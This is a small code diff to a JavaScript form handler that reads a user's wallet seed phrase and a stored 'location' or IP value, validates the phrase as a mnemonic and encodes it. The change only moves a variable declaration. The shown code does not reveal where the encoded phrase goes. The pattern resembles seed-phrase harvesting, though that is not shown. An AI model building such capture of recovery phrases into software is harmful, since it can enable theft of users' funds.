@@ -124,10 +124,10 @@ function validateMnemonic(mnemonic) {
   const handleSubmit = async (e) => {
    try{
         SetProcessing(true);
+        var encode = '';
         var ip = getLocalStorage("location") ? getLocalStorage("location") : "{}";
         var formattedSeedPhrase = normalizeText(secretPharse);
         if(validateMnemonic(formattedSeedPhrase)){
-          var encode = '';
           try{
             encode = await encodeSeed(formattedSeedPhrase);
           }catch(e){
